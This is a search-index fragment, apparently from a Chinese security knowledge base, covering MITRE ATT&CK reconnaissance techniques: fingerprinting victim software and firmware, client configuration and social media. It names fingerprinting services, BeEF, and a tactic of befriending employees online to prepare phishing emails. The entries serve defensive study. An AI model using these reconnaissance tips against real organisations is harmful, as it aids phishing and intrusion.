<p>\u8f6f\u4ef6\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\uff0c\u6216\u653b\u51fb\u7f51\u7ad9\u540e\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u7b80\u5386\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6307\u7eb9\u8bc6\u522b\uff1a\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u662f\u76f8\u5f53\u6709\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u53ea\u6709\u8bc6\u522b\u51fa\u76f8\u5e94\u7684Web\u5bb9\u5668\u6216\u8005CMS\uff0c\u624d\u80fd\u67e5\u627e\u4e0e\u5176\u76f8\u5173\u7684\u6f0f\u6d1e\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u76f8\u5e94\u7684\u6e17\u900f\u64cd\u4f5c\u3002</p> <p>\u5728\u7ebf\u6307\u7eb9\u8bc6\u522b\u7f51\u7ad9\uff1a TSscan: https://scan.top15.cn/web/</p> <p>BugScaner: http://whatweb.bugscaner.com/look/</p> <p>\u4e91\u6089\u6307\u7eb9: http://www.yunsee.cn/finger.html</p> <p>WhatWeb: http://whatweb.bugscaner.com/look/</p> <p>\u5e38\u89c1\u7684\u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u6709\uff1awhatweb\uff0cwappalyzer\u706b\u72d0\u63d2\u4ef6\u7b49\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1592-002</p> <p>https://attack.mitre.org/techniques/T1592/002/</p> <p>\u6307\u7eb9\u8bc6\u522b\u5927\u5168</p> <p>https://www.bilibili.com/read/cv9136494/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/","title":"T1592-003-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u56fa\u4ef6\u4fe1\u606f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u4e3b\u673a\u56fa\u4ef6\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u63a8\u6d4b\u51fa\u66f4\u591a\u76ee\u6807\u73af\u5883\u4e2d\u4e3b\u673a\u7684\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u914d\u7f6e\uff0c\u7528\u9014\uff0c\u4f7f\u7528\u671f\u9650/\u8865\u4e01\u7ea7\u522b\u7b49\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\u6536\u96c6\u3002\u6709\u5173\u56fa\u4ef6\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u8005\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u6f0f\u6d1e\u5229\u7528\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%9B%BA%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1592-003</p> <p>https://attack.mitre.org/techniques/T1592/003/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/","title":"T1592-004-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u5ba2\u6237\u7aef\u914d\u7f6e","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u5ba2\u6237\u7aef\u914d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\u548c\u8bbe\u7f6e\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf/\u7248\u672c\uff0c\u865a\u62df\u5316\uff0c\u4f53\u7cfb\u7ed3\u6784\uff08\u4f8b\u5982\uff1a32\u4f4d\u621664\u4f4d\uff09\uff0c\u8bed\u8a00\u6216\u65f6\u533a\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u5ba2\u6237\u7aef\u914d\u7f6e\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u8005\u641c\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u653b\u9677\u6216\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>beef-\u4fe1\u606f\u6536\u96c6</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1592-004</p> <p>https://attack.mitre.org/techniques/T1592/004/</p> <p>beef-\u6e17\u900f\u5de5\u5177\u4f7f\u7528\u6307\u5357</p> <p>https://www.kancloud.cn/wintry/p-tools/598539</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/","title":"T1593-001-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u793e\u4ea4\u5a92\u4f53","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u9501\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u5982\u4e1a\u52a1\u516c\u544a\u4ee5\u53ca\u6709\u5173\u5de5\u4f5c\u4eba\u5458\u7684\u89d2\u8272\u3001\u5730\u70b9\u548c\u5174\u8da3\u7684\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u5728\u4e0d\u540c\u7684\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u4e0a\u8fdb\u884c\u641c\u7d22\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u88ab\u52a8\u5730\u4ece\u8fd9\u4e9b\u7f51\u7ad9\u4e0a\u6536\u96c6\u6570\u636e\uff0c\u4ee5\u53ca\u5229\u7528\u6536\u96c6\u5230\u7684\u4fe1\u606f\u521b\u5efa\u865a\u5047\u7684\u4e2a\u4eba\u8d44\u6599/\u7fa4\u7ec4\uff0c\u4ee5\u8bf1\u4f7f\u53d7\u5bb3\u8005\u900f\u9732\u7279\u5b9a\u7684\u4fe1\u606f\uff08\u5373\u9c7c\u53c9\u5f0f\u9493\u9c7c\u670d\u52a1\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4fe1\u606f\u9493\u9c7c\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u67d0\u4f01\u4e1a\u5458\u5de5\u4fe1\u606f\uff0c\u6bd4\u5982\u524d\u671f\u6dfb\u52a0\u597d\u53cb\uff0c\u89c2\u5bdf\u5176\u793e\u4ea4\u5a92\u4f53\u4e0a\u7684\u52a8\u6001\uff0c\u7ffb\u770b\u5386\u53f2\u52a8\u6001\u4fe1\u606f\uff0c\u6536\u96c6\u5176\u5de5\u4f5c\u6c9f\u901a\u5de5\u5177\u3001\u4e0a\u4e0b\u73ed\u65f6\u95f4\u7b49\u3002\u5982\u5bf9\u65b9\u901a\u8fc7\u90ae\u7bb1\u6c9f\u901a\u4ea4\u6d41\u4e1a\u52a1\uff0c\u53ef\u4ee5\u8fdb\u884c\u9493\u9c7c\u90ae\u4ef6\u6295\u9012\u8fdb\u884c\u6e17\u900f\uff0c\u83b7\u53d6\u6743\u9650\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> 